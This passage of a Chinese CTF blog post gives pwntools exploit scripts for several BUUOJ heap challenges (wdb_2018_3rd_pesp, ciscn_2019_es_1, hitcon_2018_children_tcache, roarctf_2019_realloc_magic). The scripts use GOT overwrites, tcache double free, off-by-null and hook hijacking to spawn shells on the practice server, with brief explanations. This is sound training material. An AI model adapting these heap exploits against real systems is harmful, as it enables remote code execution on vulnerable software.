    add(<span class="number">24</span>,<span class="string">"3333"</span>) <span class="comment"># 3</span>
    payload = <span class="string">"a"</span>*<span class="number">0x38</span> + p8(<span class="number">0x41</span>)
    edit(<span class="number">0</span>,payload)
    free(<span class="number">1</span>)
    add(<span class="number">56</span>,<span class="string">"fuck"</span>) <span class="comment"># 1</span>
    payload = <span class="string">"a"</span>*<span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x18</span>) + p64(elf.got[<span class="string">'free'</span>])
    edit(<span class="number">1</span>,payload)
    show(<span class="number">2</span>)
    free_addr = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))
    log.success(<span class="string">"free_addr==&gt;"</span> + hex(free_addr))
    libc_base = free_addr - libc.sym[<span class="string">'free'</span>]
    log.success(<span class="string">"libc_base==&gt;"</span> + hex(libc_base))
    system = libc_base + libc.sym[<span class="string">'system'</span>]
    edit(<span class="number">2</span>,p64(system))
    add(<span class="number">24</span>,<span class="string">"/bin/sh"</span>) <span class="comment"># 4</span>
    free(<span class="number">4</span>)
    p.interactive()
exp()</code></pre>
<h2 id="0x25-wdb-2018-3rd-pesp"><a href="#0x25-wdb-2018-3rd-pesp" class="headerlink" title="0x25 wdb_2018_3rd_pesp"></a>0x25 wdb_2018_3rd_pesp</h2><p>这个题比较简单，edit存在任意字节溢出，模仿ZJCTF那个题做，改chunk0的指针为free_got，然后改free_got为system，但是有一个需要注意的，edit还存在off by null，会把后面一个地址的低字节置0，而free_got下面就是put_got，这一波直接把puts_got改炸了，程序就挂了，所以要把puts_got复原  </p>
<pre><code class="python"><span class="comment">#!/usr/bin/env python</span>
<span class="comment">#coding=utf-8</span>
<span class="keyword">from</span> pwn <span class="keyword">import</span>*
<span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *
<span class="keyword">import</span> sys
context.log_level = <span class="string">'debug'</span>
context.terminal = [<span class="string">'terminator'</span>,<span class="string">'-x'</span>,<span class="string">'sh'</span>,<span class="string">'-c'</span>]
binary = <span class="string">'./wdb_2018_3rd_pesp'</span> 
local = <span class="number">0</span>
<span class="keyword">if</span> local == <span class="number">1</span>:
    p=process(binary)
<span class="keyword">else</span>:
    p=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">26391</span>)
elf=ELF(binary)
libc=elf.libc
<span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span>
    p.recvuntil(<span class="string">"choice:"</span>)
    p.sendline(<span class="string">"2"</span>)
    p.recvuntil(<span class="string">"name:"</span>)
    p.sendline(str(size))
    p.recvuntil(<span class="string">"servant:"</span>)
    p.sendline(content)
<span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,size,content)</span>:</span>
    p.recvuntil(<span class="string">"choice:"</span>)
    p.sendline(<span class="string">"3"</span>)
    p.recvuntil(<span class="string">"servant:"</span>)
    p.sendline(str(index))
    p.recvuntil(<span class="string">"name:"</span>)
    p.sendline(str(size))
    p.recvuntil(<span class="string">"servnat:"</span>)
    p.sendline(content)
<span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span>
    p.recvuntil(<span class="string">"choice:"</span>)
    p.sendline(<span class="string">"1"</span>)
<span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span>
    p.recvuntil(<span class="string">"choice:"</span>)
    p.sendline(<span class="string">"4"</span>)
    p.recvuntil(<span class="string">"servant:"</span>)
    p.sendline(str(index))
<span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span>

    add(<span class="number">0x60</span>,<span class="string">"a"</span>*<span class="number">0x20</span>) <span class="comment"># 0</span>
    add(<span class="number">0x60</span>,<span class="string">"b"</span>*<span class="number">0x20</span>) <span class="comment"># 1</span>
    add(<span class="number">0x60</span>,<span class="string">"/bin/sh\x00"</span>) <span class="comment"># 2</span>
    free(<span class="number">1</span>)
    payload = <span class="string">"a"</span>*<span class="number">0x60</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(<span class="number">0x6020ad</span>)
    edit(<span class="number">0</span>,len(payload),payload)
    add(<span class="number">0x60</span>,<span class="string">"a"</span>*<span class="number">0x20</span>)
    payload = <span class="string">"a"</span>*<span class="number">3</span> + p64(<span class="number">0x60</span>) + p64(<span class="number">0x602018</span>)
    add(<span class="number">0x60</span>,payload)
    show()
    addr = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))
    libc_base = addr - libc.symbols[<span class="string">'free'</span>]
    system = libc_base + libc.sym[<span class="string">'system'</span>]
    log.success(<span class="string">"libc_base==&gt;"</span> + hex(libc_base))
    log.success(<span class="string">"system==&gt;"</span> + hex(system))

    payload = p64(system) + p64(libc_base + libc.sym[<span class="string">'puts'</span>])
    edit(<span class="number">0</span>,len(payload),payload)
    free(<span class="number">2</span>)

    p.interactive()
exp()</code></pre>
<h2 id="0x26-gyctf-2020-force"><a href="#0x26-gyctf-2020-force" class="headerlink" title="0x26  gyctf_2020_force"></a>0x26  gyctf_2020_force</h2><p><a href="https://n0vice.top/2020/05/09/%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0house-of-force/index.html" target="_blank" rel="noopener">https://n0vice.top/2020/05/09/%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0house-of-force/index.html</a>  </p>
<h2 id="0x27-ciscn-2019-es-1"><a href="#0x27-ciscn-2019-es-1" class="headerlink" title="0x27  ciscn_2019_es_1"></a>0x27  ciscn_2019_es_1</h2><p>经典double free + tcache attack</p>
<pre><code class="python"><span class="comment">#!/usr/bin/env python</span>
<span class="comment">#coding=utf-8</span>
<span class="keyword">from</span> pwn <span class="keyword">import</span>*
<span class="keyword">import</span> sys
<span class="comment">#context.log_level = 'debug'</span>
context.terminal = [<span class="string">'terminator'</span>,<span class="string">'-x'</span>,<span class="string">'sh'</span>,<span class="string">'-c'</span>]
binary = <span class="string">'./ciscn_2019_es_1'</span> 
local = <span class="number">0</span>
<span class="keyword">if</span> local == <span class="number">1</span>:
    p=process(binary)
<span class="keyword">else</span>:
    p=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">26506</span>)
elf=ELF(binary)
<span class="comment">#libc=ELF("/lib/i386-linux-gnu/libc.so.6")</span>
libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)
<span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,name,call)</span>:</span>
    p.recvuntil(<span class="string">"choice:"</span>)
    p.sendline(<span class="string">"1"</span>)
    p.recvuntil(<span class="string">"name"</span>)
    p.sendline(str(size))
    p.recvuntil(<span class="string">"name:"</span>)
    p.send(name)
    p.recvuntil(<span class="string">"call:"</span>)
    p.send(call)
<span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span>
    p.recvuntil(<span class="string">"choice:"</span>)
    p.sendline(<span class="string">"2"</span>)
    p.recvuntil(<span class="string">"index:"</span>)
    p.sendline(str(index))
<span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span>
    p.recvuntil(<span class="string">"choice:"</span>)
    p.sendline(<span class="string">"3"</span>)
    p.recvuntil(<span class="string">"index:"</span>)
    p.sendline(str(index))

<span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span>
    add(<span class="number">0x4f0</span>,<span class="string">"a"</span>,<span class="string">"b"</span>)
    add(<span class="number">0x20</span>,<span class="string">"a"</span>,<span class="string">"b"</span>)
    add(<span class="number">0x40</span>,<span class="string">"/bin/sh"</span>,<span class="string">"/bin/sh"</span>)
    free(<span class="number">0</span>)
    show(<span class="number">0</span>)
    puts_addr = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))
    log.success(<span class="string">"puts_addr==&gt;"</span> + hex(puts_addr))
    libc_base = puts_addr - <span class="number">0x3ebca0</span>
    log.success(<span class="string">"libc_base==&gt;"</span> + hex(libc_base))
    free_hook = libc_base + libc.sym[<span class="string">"__free_hook"</span>]
    log.success(<span class="string">"free_hook==&gt;"</span> + hex(free_hook))
    system = libc_base + libc.sym[<span class="string">'system'</span>]
    log.success(<span class="string">"system==&gt;"</span> + hex(system))
    free(<span class="number">1</span>)
    free(<span class="number">1</span>)
    add(<span class="number">0x20</span>,p64(free_hook),<span class="string">"a"</span>)
    add(<span class="number">0x20</span>,<span class="string">"a"</span>,<span class="string">"b"</span>)
    add(<span class="number">0x20</span>,p64(system),<span class="string">"a"</span>)
    free(<span class="number">2</span>)
    <span class="comment">#gdb.attach(p)</span>

    p.interactive()
exp()</code></pre>
<h2 id="0x28-hitcon-2018-children-tcache"><a href="#0x28-hitcon-2018-children-tcache" class="headerlink" title="0x28 hitcon_2018_children_tcache"></a>0x28 hitcon_2018_children_tcache</h2><p>off by null + tcache attack  </p>
<pre><code class="python"><span class="comment">#!/usr/bin/env python</span>
<span class="comment">#coding=utf-8</span>
<span class="keyword">from</span> pwn <span class="keyword">import</span>*
<span class="keyword">import</span> sys
<span class="comment">#context.log_level = 'debug'</span>
context.terminal = [<span class="string">'terminator'</span>,<span class="string">'-x'</span>,<span class="string">'sh'</span>,<span class="string">'-c'</span>]
binary = <span class="string">'./HITCON_2018_children_tcache'</span> 
local = <span class="number">0</span>
<span class="keyword">if</span> local == <span class="number">1</span>:
    p=process(binary)
<span class="keyword">else</span>:
    p=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">29514</span>)
elf=ELF(binary)
libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)
<span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span>
    p.recvuntil(<span class="string">"choice: "</span>)
    p.sendline(<span class="string">"1"</span>)
    p.recvuntil(<span class="string">"Size:"</span>)
    p.sendline(str(size))
    p.recvuntil(<span class="string">"Data:"</span>)
    p.send(content)
<span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span>
    p.recvuntil(<span class="string">"choice: "</span>)
    p.sendline(<span class="string">"2"</span>)
    p.recvuntil(<span class="string">"Index:"</span>)
    p.sendline(str(index))
<span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span>
    p.recvuntil(<span class="string">"choice: "</span>)
    p.sendline(<span class="string">"3"</span>)
    p.recvuntil(<span class="string">"Index:"</span>)
    p.sendline(str(index))
<span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span>
    add(<span class="number">0x410</span>,<span class="string">"a"</span>) <span class="comment"># 0</span>
    add(<span class="number">0x28</span>,<span class="string">"a"</span>) <span class="comment"># 1</span>
    add(<span class="number">0x4f0</span>,<span class="string">"a"</span>) <span class="comment"># 2</span>
    add(<span class="number">0x28</span>,<span class="string">"a"</span>) <span class="comment"># 3</span>
    free(<span class="number">1</span>)
    free(<span class="number">0</span>)
    <span class="keyword">for</span> i <span class="keyword">in</span> range (<span class="number">0</span>,<span class="number">9</span>):
        add(<span class="number">0x28</span>-i,<span class="string">'a'</span>*(<span class="number">0x28</span>-i))<span class="comment">#0</span>
        free(<span class="number">0</span>)
    add(<span class="number">0x28</span>,<span class="string">"a"</span>*<span class="number">0x20</span>+p64(<span class="number">0x450</span>)) <span class="comment"># 0</span>
    free(<span class="number">2</span>)
    add(<span class="number">0x410</span>,<span class="string">"a"</span>) <span class="comment"># 1</span>
    show(<span class="number">0</span>)
    addr = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))
    libc_base = addr - <span class="number">0x3ebca0</span>
    malloc_hook = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]
    free_hook = libc_base + libc.sym[<span class="string">'__free_hook'</span>]
    system = libc_base + libc.sym[<span class="string">'system'</span>]
    one = libc_base + <span class="number">0x4f322</span>
    log.success(<span class="string">"libc_base==&gt;"</span> + hex(libc_base))
    log.success(<span class="string">"malloc_hook==&gt;"</span> + hex(malloc_hook))
    log.success(<span class="string">"free_hook==&gt;"</span> + hex(free_hook))
    log.success(<span class="string">"system==&gt;"</span> + hex(system))

    add(<span class="number">0x28</span>,<span class="string">"b"</span>) <span class="comment"># 2</span>
    free(<span class="number">2</span>)
    free(<span class="number">0</span>)

    add(<span class="number">0x28</span>,p64(malloc_hook))
    add(<span class="number">0x28</span>,<span class="string">"a"</span>)
    add(<span class="number">0x28</span>,p64(one))
    p.interactive()
exp()</code></pre>
<h2 id="0x29-roarctf-2019-realloc-magic"><a href="#0x29-roarctf-2019-realloc-magic" class="headerlink" title="0x29  roarctf_2019_realloc_magic"></a>0x29  roarctf_2019_realloc_magic</h2><p>利用uaf和chunk overlap改fd处的main_arena+96的后1.5字节，剩余0.5字节爆破，使其变成_IO_2_1_stdout_，然后改_IO_2_1_stdout_中的IO_write_base和flags泄露_IO_file_jumps函数地址，最后打free_hook为system<br>exp  </p>
<pre><code class="python"><span class="comment">#!/usr/bin/env python</span>
<span class="comment">#coding=utf-8</span>
<span class="keyword">from</span> pwn <span class="keyword">import</span>*
<span class="keyword">import</span> sys
<span class="comment">#context.log_level = 'debug'</span>
context.terminal = [<span class="string">'terminator'</span>,<span class="string">'-x'</span>,<span class="string">'sh'</span>,<span class="string">'-c'</span>]
binary = <span class="string">'./roarctf_2019_realloc_magic'</span> 
local = <span class="number">0</span>
<span class="keyword">if</span> local == <span class="number">1</span>:
    p=process(binary)
<span class="keyword">else</span>:
    p=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">25767</span>)
elf=ELF(binary)
libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)
<span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span>
    p.recvuntil(<span class="string">"&gt;&gt; "</span>)
    p.sendline(<span class="string">"1"</span>)
    p.recvuntil(<span class="string">"Size?"</span>)
    p.sendline(str(size))
    p.recvuntil(<span class="string">"Content?"</span>)
    p.send(content)
<span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">()</span>:</span>
    p.recvuntil(<span class="string">"&gt;&gt; "</span>)
    p.sendline(<span class="string">"2"</span>)

<span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span>
    add(<span class="number">0x70</span>,<span class="string">"a"</span>)
    add(<span class="number">0</span>,<span class="string">""</span>)
    add(<span class="number">0x100</span>,<span class="string">"a"</span>)
    add(<span class="number">0</span>,<span class="string">""</span>)
    add(<span class="number">0xa0</span>,<span class="string">"a"</span>)
    add(<span class="number">0</span>,<span class="string">""</span>)
    add(<span class="number">0x100</span>,<span class="string">"b"</span>)
    [free() <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>)]
    add(<span class="number">0</span>,<span class="string">""</span>)
    add(<span class="number">0x70</span>,<span class="string">"a"</span>)

    payload = <span class="string">"a"</span>*<span class="number">0x78</span> + p64(<span class="number">0x41</span>) + <span class="string">'\x60\x17'</span>
    add(<span class="number">0x180</span>,payload)
    add(<span class="number">0</span>,<span class="string">""</span>)
    add(<span class="number">0x100</span>,<span class="string">"a"</span>)
    add(<span class="number">0</span>,<span class="string">""</span>)

    payload = p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p8(<span class="number">0x58</span>)
    add(<span class="number">0x100</span>,payload)
    puts_addr = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))
    log.success(<span class="string">"puts_addr==&gt;"</span> + hex(puts_addr))
    libc_base = puts_addr - <span class="number">0x3e82a0</span>
    log.success(<span class="string">"libc_base==&gt;"</span> + hex(libc_base))
    system = libc_base + libc.sym[<span class="string">'system'</span>]
    log.success(<span class="string">"system==&gt;"</span> + hex(system))
    free_hook = libc_base + libc.sym[<span class="string">'__free_hook'</span>]
    log.success(<span class="string">"free_hook==&gt;"</span> + hex(free_hook))
    p.sendline(<span class="string">"666"</span>)
    add(<span class="number">0x120</span>,<span class="string">"a"</span>)
    add(<span class="number">0</span>,<span class="string">""</span>)
    add(<span class="number">0x130</span>,<span class="string">"a"</span>)
    add(<span class="number">0</span>,<span class="string">""</span>)
    add(<span class="number">0x170</span>,<span class="string">"a"</span>)
    add(<span class="number">0</span>,<span class="string">""</span>)
    add(<span class="number">0x130</span>,<span class="string">"a"</span>)
    [free() <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>)]
    add(<span class="number">0</span>,<span class="string">""</span>)
    add(<span class="number">0x120</span>,<span class="string">"a"</span>)
    payload = <span class="string">"a"</span> * <span class="number">0x128</span> + p64(<span class="number">0x41</span>) + p64(free_hook<span class="number">-8</span>)
    add(<span class="number">0x260</span>,payload)
    add(<span class="number">0</span>,<span class="string">""</span>)
    add(<span class="number">0x130</span>,<span class="string">"a"</span>)
    add(<span class="number">0</span>,<span class="string">""</span>)
    payload = <span class="string">"/bin/sh\x00"</span> + p64(system)
    add(<span class="number">0x130</span>,payload)
    free()

    p.interactive()
<span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:
    <span class="keyword">while</span> <span class="literal">True</span>:
        p = remote(<span class="string">"node3.buuoj.cn"</span>, <span class="number">25767</span>)
        <span class="keyword">try</span>:
            exp()
        <span class="keyword">except</span>:
            p.close()</code></pre>
<h2 id="0x30"><a href="#0x30" class="headerlink" title="0x30"></a>0x30</h2><p>咕咕咕……  </p>

      
    </div>
    
    
    

    

    
      <div>
        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
  <div>您的鼓励将支持我继续努力！</div>
  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
    <span>打赏</span>
  </button>
  <div id="QR" style="display: none;">

    
      <div id="wechat" style="display: inline-block">
        <img id="wechat_qr" src="/images/wechat.png" alt="N0vice 微信支付"/>
        <p>微信支付</p>
      </div>
    

    
      <div id="alipay" style="display: inline-block">
        <img id="alipay_qr" src="/images/alipay.jpg" alt="N0vice 支付宝"/>
        <p>支付宝</p>
      </div>
    

    

  </div>
</div>

      </div>
    

    
      <div>
        <ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>本文作者：</strong>
    N0vice
  </li>
  <li class="post-copyright-link">
    <strong>本文链接：</strong>
    <a href="http://yoursite.com/2099/12/12/BUUOJ-pwn-%E4%B8%8D%E5%AE%9A%E6%9C%9F%E6%9B%B4%E6%96%B0/" title="BUUOJ pwn(不定期更新)">http://yoursite.com/2099/12/12/BUUOJ-pwn-%E4%B8%8D%E5%AE%9A%E6%9C%9F%E6%9B%B4%E6%96%B0/</a>
  </li>
  <li class="post-copyright-license">
    <strong>版权声明： </strong>
    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
  </li>
</ul>

      </div>
    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/pwn/" rel="tag"># pwn</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2023/01/03/2022%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/" rel="next" title="2022年终总结">
                <i class="fa fa-chevron-left"></i> 2022年终总结
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="/images/avatar.jpg"
                alt="N0vice" />
            
              <p class="site-author-name" itemprop="name">N0vice</p>
              <p class="site-description motion-element" itemprop="description">从前我是瞎的，如今我看得见</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">49</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">7</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/N0vice21" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="https://www.zhihu.com/people/luo-yu-piao" target="_blank" title="知乎">
                      
                        <i class="fa fa-fw fa-zhihu"></i>知乎</a>
                  </span>
                
            </div>
          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                Links
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="http://spacey.top/" title="Elli0t" target="_blank">Elli0t</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://www.ericdshen.com/" title="EDS" target="_blank">EDS</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://migraine-sudo.github.io" title="Migraine" target="_blank">Migraine</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://shawroot.cc/" title="Root" target="_blank">Root</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.yuque.com/pi3ntn/azmee3" title="Lime" target="_blank">Lime</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://mrbelieve128.github.io/" title="Mr.Believe" target="_blank">Mr.Believe</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://l0x1c.github.io/" title="L0x1c" target="_blank">L0x1c</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://binlep.top/" title="binlep" target="_blank">binlep</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://1p0ch.cn/" title="1p0ch" target="_blank">1p0ch</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://retr0.vip/" title="Retr_0" target="_blank">Retr_0</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://www.pwn4fun.com/" title="Railgun" target="_blank">Railgun</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://hackerpoet.com/" title="T4rn" target="_blank">T4rn</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://blog.csdn.net/SopRomeo" title="penson" target="_blank">penson</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.cnblogs.com/lemon629/" title="lemon" target="_blank">lemon</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://surager.pub/" title="5ur4g3r" target="_blank">5ur4g3r</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://www.snowywar.top/" title="snowywar" target="_blank">snowywar</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-rip覆盖一下"><span class="nav-number">1.</span> <span class="nav-text">0x01 rip覆盖一下</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-warmup-csaw-2016"><span class="nav-number">2.</span> <span class="nav-text">0x02 warmup_csaw_2016</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-ciscn-2019-n-1"><span class="nav-number">3.</span> <span class="nav-text">0x03  ciscn_2019_n_1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-HarekazeCTF2019-baby-rop2"><span class="nav-number">4.</span> <span class="nav-text">0x04  [HarekazeCTF2019]baby_rop2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-BWrqt–spwn"><span class="nav-number">5.</span> <span class="nav-text">0x05 BWrqt–spwn</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-bjdctf-2020-babystack2"><span class="nav-number">6.</span> <span class="nav-text">0x06  bjdctf_2020_babystack2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07-hitcontraining-uaf"><span class="nav-number">7.</span> <span class="nav-text">0x07 hitcontraining_uaf</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x08-pwnable-hacknote"><span class="nav-number">8.</span> <span class="nav-text">0x08 pwnable_hacknote</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x09-gyctf-2020-borrowstack"><span class="nav-number">9.</span> <span class="nav-text">0x09 gyctf_2020_borrowstack</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x10-ciscn-2019-es-7-ciscn-2019-s-3"><span class="nav-number">10.</span> <span class="nav-text">0x10  ciscn_2019_es_7&#x2F;ciscn_2019_s_3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x11-hitcon2014-stkof"><span class="nav-number">11.</span> <span class="nav-text">0x11  hitcon2014_stkof</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x12-actf-2019-babystack"><span class="nav-number">12.</span> <span class="nav-text">0x12  actf_2019_babystack</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x13-pwnable-orw"><span class="nav-number">13.</span> <span class="nav-text">0x13 pwnable_orw</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x14-get-started-3dsctf-2016-amp-amp-not-the-same-3dsctf-2016"><span class="nav-number">14.</span> <span class="nav-text">0x14  get_started_3dsctf_2016 &amp;&amp; not_the_same_3dsctf_2016</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x15-hitcontraining-heapcreator"><span class="nav-number">15.</span> <span class="nav-text">0x15  hitcontraining_heapcreator</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x16-cmcc-pwnme1"><span class="nav-number">16.</span> <span class="nav-text">0x16  cmcc_pwnme1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x17-0ctf2017-babyheap"><span class="nav-number">17.</span> <span class="nav-text">0x17  0ctf2017-babyheap</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x18-wdb2018-guess"><span class="nav-number">18.</span> <span class="nav-text">0x18  wdb2018_guess</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x19-hitcontraining-magicheap"><span class="nav-number">19.</span> <span class="nav-text">0x19  hitcontraining_magicheap</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x20-roarctf-2019-easy-pwn"><span class="nav-number">20.</span> <span class="nav-text">0x20 roarctf_2019_easy_pwn</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x21-gyctf-2020-document"><span class="nav-number">21.</span> <span class="nav-text">0x21 gyctf_2020_document</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x22-others-babystack"><span class="nav-number">22.</span> <span class="nav-text">0x22  others_babystack</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x23-gyctf-2020-some-thing-exceting"><span class="nav-number">23.</span> <span class="nav-text">0x23 gyctf_2020_some_thing_exceting</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x24-npuctf-2020-easyheap"><span class="nav-number">24.</span> <span class="nav-text">0x24  npuctf_2020_easyheap</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x25-wdb-2018-3rd-pesp"><span class="nav-number">25.</span> <span class="nav-text">0x25 wdb_2018_3rd_pesp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x26-gyctf-2020-force"><span class="nav-number">26.</span> <span class="nav-text">0x26  gyctf_2020_force</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x27-ciscn-2019-es-1"><span class="nav-number">27.</span> <span class="nav-text">0x27  ciscn_2019_es_1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x28-hitcon-2018-children-tcache"><span class="nav-number">28.</span> <span class="nav-text">0x28 hitcon_2018_children_tcache</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x29-roarctf-2019-realloc-magic"><span class="nav-number">29.</span> <span class="nav-text">0x29  roarctf_2019_realloc_magic</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x30"><span class="nav-number">30.</span> <span class="nav-text">0x30</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2023</span>
